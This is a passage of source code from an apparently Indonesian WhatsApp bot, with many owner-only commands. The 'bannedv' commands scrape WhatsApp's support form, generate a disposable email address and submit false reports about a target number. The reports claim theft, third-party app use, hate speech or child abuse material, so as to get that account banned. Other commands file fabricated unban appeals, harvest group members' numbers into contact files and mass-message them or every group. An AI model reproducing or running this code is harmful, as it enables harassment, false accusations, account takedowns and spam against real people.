let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await qyuunee.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv6": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await qyuunee.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv1": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await qyuunee.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await qyuunee.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await qyuunee.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await qyuunee.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await qyuunee.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'setppbot': {
            function _0x1d19(){var _0x2bf2ef=['4259820vXkaKE','Sukses','89480afqcnZ','w:profile:picture','14DnKvaS','query','557985WFRGrv','856CAraQC','success','downloadAndSaveMediaMessage','test','5UCtsZI','Kirim/Reply\x20Image\x20Dengan\x20Caption\x20','set','unlinkSync','owner','22363110hLRSWH','1954998hCwgXG','picture','image','13034PkdVqU','updateProfilePicture','full','8PPEhfy','ppbot.jpeg','702420tyMrpN'];_0x1d19=function(){return _0x2bf2ef;};return _0x1d19();}var _0x2d2a75=_0x31ee;(function(_0x5beddb,_0x17a0e1){var _0x80bc9d=_0x31ee,_0x3970a4=_0x5beddb();while(!![]){try{var _0x4da0e6=parseInt(_0x80bc9d(0x1ff))/0x1*(-parseInt(_0x80bc9d(0x201))/0x2)+-parseInt(_0x80bc9d(0x1e9))/0x3*(parseInt(_0x80bc9d(0x1fa))/0x4)+-parseInt(_0x80bc9d(0x1ee))/0x5*(parseInt(_0x80bc9d(0x1fd))/0x6)+-parseInt(_0x80bc9d(0x1f7))/0x7*(parseInt(_0x80bc9d(0x1ea))/0x8)+parseInt(_0x80bc9d(0x1f4))/0x9+parseInt(_0x80bc9d(0x1fc))/0xa+parseInt(_0x80bc9d(0x1f3))/0xb;if(_0x4da0e6===_0x17a0e1)break;else _0x3970a4['push'](_0x3970a4['shift']());}catch(_0x322f7a){_0x3970a4['push'](_0x3970a4['shift']());}}}(_0x1d19,0x64cf8));if(!isOwner)return reply(mess[_0x2d2a75(0x1f2)]);function _0x31ee(_0x4a5085,_0x23d021){var _0x1d199d=_0x1d19();return _0x31ee=function(_0x31ee4c,_0xf0e768){_0x31ee4c=_0x31ee4c-0x1e8;var _0x46be36=_0x1d199d[_0x31ee4c];return _0x46be36;},_0x31ee(_0x4a5085,_0x23d021);}if(!quoted)return reply(_0x2d2a75(0x1ef)+(prefix+command));if(!/image/[_0x2d2a75(0x1ed)](mime))return reply(_0x2d2a75(0x1ef)+(prefix+command));if(/webp/[_0x2d2a75(0x1ed)](mime))return reply(_0x2d2a75(0x1ef)+(prefix+command));var medis=await qyuunee[_0x2d2a75(0x1ec)](quoted,_0x2d2a75(0x1fb));if(args[0x0]==_0x2d2a75(0x1f9)){var {img}=await generateProfilePicture(medis);await qyuunee[_0x2d2a75(0x1e8)]({'tag':'iq','attrs':{'to':botNumber,'type':_0x2d2a75(0x1f0),'xmlns':_0x2d2a75(0x200)},'content':[{'tag':_0x2d2a75(0x1f5),'attrs':{'type':_0x2d2a75(0x1f6)},'content':img}]}),fs[_0x2d2a75(0x1f1)](medis),reply(mess[_0x2d2a75(0x1eb)]);}else{var memeg=await qyuunee[_0x2d2a75(0x1f8)](botNumber,{'url':medis});fs[_0x2d2a75(0x1f1)](medis),reply(_0x2d2a75(0x1fe));}
            }
        break
case "jadibot":{
if (!isOwner) return reply(mess.only.owner)
if (m.isGroup) return
jadibot(qyuunee, sender)
}
break
case "listjadibot":{
if (m.isGroup) return
listjadibot(qyuunee, m)
}
break
case "stopjadibot":{
if (!isOwner) return reply(mess.only.owner)
if (m.isGroup) return
stopjadibot(qyuunee, sender)
}
break
case 'qc': {
            if (!q) return ('Masukan Text')
            let ppnyauser = await await qyuunee.profilePictureUrl(m.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
            const rest = await quote(q, pushname, ppnyauser)
            qyuunee.sendStimg(from, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
            }
            break
case "bass": case "blown": case "deep": case "earrape": case "fast": case "fat": case "nightcore": case "reverse": case "robot": case "slow": case "smooth": case "tupai": {
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
reply(mess.wait)
let media = await qyuunee.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
qyuunee.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
reply(e)
}}
break
case "tohuruf": {
if (!Number(args[0])) return reply(`Example:\n${prefix}tohuruf 456`)
try {
quere = args.join(" ")
convertes = await angkaTerbilang(quere)
reply(`\`\`\`「 ALPHABET 」\`\`\`\n*•> Number :*\n${quere}\n*•> Alphabet :*\n${convertes}`)
} catch {
reply("Error")
}
}
break
case "ttp":{
if (!q) return reply("Teks Nya Mana Kak?")
let txt1 = await Ttp(q)
let txt2 = txt1.result
let txt3 = await getBuffer(txt2)
qyuunee.sendStimg(from, txt3, m, { packname: global.packname, author: global.author })
}
break
case "ebinary": {
if (!q) return reply(`Kirim text dengan caption ${prefix + command} koi`)
let eb = await eBinary(q)
reply(eb)
}
break
case "dbinary": {
if (!q) return reply(`Kirim text dengan caption ${prefix + command} koi`)
let db = await dBinary(q)
reply(db)
}
break
case "tourl":
try {
mee = await qyuunee.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
qyuunee.sendMessage(from, { text: mem }, { quoted: m })
} catch (err) {
reply(`Kirim/Reply Dengan Caption ${prefix + command}`)
}
break
case "bucin": case "dare": case "faktaunix": case "fml": case "katabijak": case "katacinta": case "katagalau": case "katahacker": case "katailham": case "katasenja": case "katasindiran": case "motivasi": case "nickff": case "pantun": case "puisi": case "quotesislamic": case "quotespubg": case "truth": {
const t3xt = require(`./all/database/text/${command}.json`)
const r4andT3xt = t3xt[Math.floor(Math.random() * t3xt.length)]
qyuunee.sendMessage(from, { text: r4andT3xt }, { quoted: m })
}
break
case "ceritahoror": {
const c3t = JSON.parse(fs.readFileSync("./all/database/text/ceritahoror.json"))
const r4andC3t = c3t[Math.floor(Math.random() * c3t.length)]
const tzt99 = `*CERITA HOROR*

Judul : ${r4andC3t.judul}
Desc : ${r4andC3t.desc}
Story : ${r4andC3t.story}`
qyuunee.sendMessage(from, { image: { url: r4andC3t.thumb }, caption: tzt99 }, { quoted: m })
}
break
case "quotes": {
const qu0 = JSON.parse(fs.readFileSync("./all/database/text/quotes.json"))
const r4ndQu0 = qu0[Math.floor(Math.random() * qu0.length)]
const tyt99 = `*QUOTES RANDOM*

Author : ${r4ndQu0.author}
Quotes : ${r4ndQu0.quotes}`
qyuunee.sendMessage(from, { text: tyt99 }, { quoted: m })
}
break
case "quotesanime": {
const an1 = JSON.parse(fs.readFileSync("./all/database/text/quotesanime.json"))
const r4ndan1 = an1[Math.floor(Math.random() * an1.length)]
const tgt99 = `*QUOTES ANIME RANDOM*

Nama Anime : ${r4ndan1.anime}
Nama Character : ${r4ndan1.character}
Episode : ${r4ndan1.episode}
Quotes : ${r4ndan1.quotes}`
qyuunee.sendMessage(from, { text: tgt99 }, { quoted: m })
}
break
case "cekidgc": {
if (!isOwner) return reply(mess.only.owner)
let getGroups = await qyuunee.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await qyuunee.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case "pv1":{
if (!isOwner) return reply(mess.only.owner)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Command Salah Seharusnya Command ${prefix+command} *idgroup|tekspushkontak*\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
global.idgcns = text.split("|")[0]
global.tekspushkon = text.split("|")[1]
const groupMetadataa = !isGroup? await qyuunee.groupMetadata(global.idgcns).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
if (isContacts) return
for (let mem of halls) {
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await qyuunee.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await qyuunee.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(2000)
} else {
await qyuunee.sendMessage(mem, { text: global.tekspushkon })
await sleep(2000)
}
}
qyuunee.sendMessage("6289508082845@s.whatsapp.net", {text:`🕊️ Sukses Bang...`})
}
break
case "pv2":{
if (!isOwner) return reply(mess.only.owner)
if (!isGroup) return reply(mess.only.group)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
global.tekspushkonv2 = text
const groupMetadata = isGroup? await qyuunee.groupMetadata(from).catch(e => {}) : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await qyuunee.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await qyuunee.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(3000)
} else {
await qyuunee.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(3000)
}
}
qyuunee.sendMessage("6289508082845@s.whatsapp.net", {text:`🕊️ Sukses Bang...`})
}
break
case "savecontact": {
if (!isOwner) return reply(mess.only.owner)
reply(mess.wait)
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA [${index}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await qyuunee.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "share": {
if (!isOwner) return reply(mess.only.owner)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group`)
reply(mess.wait)
let getGroups = await qyuunee.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
global.teksjpm = text
for (let xnxx of anu) {
let metadat72 = await qyuunee.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await qyuunee.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await qyuunee.sendMessage(xnxx, { image: { url: mem }, caption: global.teksjpm, contextInfo:{ mentionedJid: participanh.map(a => a.id) } }, { quoted: fowner })
await sleep(2000)
} else {
await qyuunee.sendMessage(xnxx, { text: global.teksjpm, contextInfo:{ mentionedJid: participanh.map(a => a.id) } }, { quoted: fowner })
await sleep(2000)
}}
}
break
case "toptv": {
try {
const msg = await require("baileys").generateWAMessageContent({ video: await m.quoted.download() }, { upload: qyuunee.waUploadToServer })
await qyuunee.relayMessage(from, { ptvMessage: { ...msg.videoMessage } }, {})
} catch (err) {
reply(`Kirim Reply Video Dengan Caption ${prefix + command}`)
}
}
break

case 'hd':
case 'remini':
case 'hdfree': {
if (!isOwner) return reply("🚫 Lu Bukan Koi...")
const meks = await qyuunee.downloadAndSaveMediaMessage(quoted)
const oke = await uptotelegra(meks)
result = await getBuffer(`https://vihangayt.me/tools/enhance?url=${oke}`)
qyuunee.sendMessage(m.chat, {image: result, mimetype: 'image/png'}, {quoted:m})
}
break

case 'toanime': {
const meks = await qyuunee.downloadAndSaveMediaMessage(quoted)
const oke = await uptotelegra(meks)
result = await getBuffer(`https://vihangayt.me/tools/toanime?url=${oke}`)
qyuunee.sendMessage(m.chat, {image: result, mimetype: 'image/png'}, {quoted:m})
}
break
case 'colorize': {
if (!quoted) return reply(`Kirim/Reply Gambar Hitam Putih Dengan Caption ${prefix+command}`)
const meks = await qyuunee.downloadAndSaveMediaMessage(quoted)
const oke = await uptotelegra(meks)
result = await getBuffer(`https://vihangayt.me/tools/colorize?url=${oke}`)
qyuunee.sendMessage(m.chat, {image: result, mimetype: 'image/png'}, {quoted:m})
}
break
case 'ai':
            case 'openai': {
                if (!full_args) return reply('Apa yang kamu ingin ketahui?')
                let d = await fetchJson(`https://vihangayt.me/tools/chatgpt5?q=${full_args}`)                
                await qyuunee.sendMessage(from, {
                    text: d.data
                }, { quoted: m})
            }
            break
case 'ping':
            case 'botstatus':
            case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
‣ Kecepatan Respon *${latensi.toFixed(4)} _Second_* \n *${oldd - neww} _miliseconds_*\n\n‣ *Runtime* : ${runtime(process.uptime())}

▧「 *INFO SERVER* 」
‣ *RAM* : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

${cpus[0] ? `▧「 *TOTAL CPU USAGE* 」\n‣ ${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
‣ CPU Core(s) Usage (${cpus.length} Core CPU)` : ''}
`.trim()
                await qyuunee.sendMessage(m.chat, {
                    text: respon,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: 'STATUS SERVER',
                            body: `${latensi.toFixed(4)} Second`,
                            thumbnailUrl: 'https://telegra.ph/file/40eac67db53cc49a52469.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break

case 'git': case 'gitclone':
                if (!args[0]) return reply(`Mana link nya?`)
                if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
                let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
                let [, user, repo] = args[0].match(regex1) || []
                repo = repo.replace(/.git$/, '')
                let url = `https://api.github.com/repos/${user}/${repo}/zipball`
                let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
                qyuunee.sendMessage(m.chat, { document: { url: url }, fileName: filename, mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
            .catch(console.error)
            break

case 'tiktok':
			if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
			reply(mess.wait)
			axios.get(`https://vihangayt.me/download/tiktok2?url=${args[0]}`).then(({ data }) => {
